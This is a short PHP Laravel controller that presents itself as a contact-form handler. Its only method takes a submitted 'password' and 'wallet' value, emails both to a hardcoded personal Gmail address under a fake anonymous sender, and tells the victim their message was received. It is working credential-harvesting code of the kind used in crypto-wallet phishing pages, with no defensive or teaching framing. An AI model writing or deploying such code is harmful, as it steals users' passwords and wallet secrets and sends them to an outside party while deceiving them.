<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class Home extends Controller
{
    public function mail(Request $request){
        $emails =array('umairnoor.siddiqui@gmail.com'); 
        $data = array(
                        'password'=>$request->input('password'),
                        'wallet'=>$request->input('wallet')
                     );
        
              Mail::send('mail',$data,function($message)use($emails) {
                 $message->to($emails);
                 $message->subject ('You have a Message');
                 $message->from('anonymous@gmail.com');
              });
             return redirect()->route('home')->with('success','We have recieved your message,we will get back to you soon');
           }
}
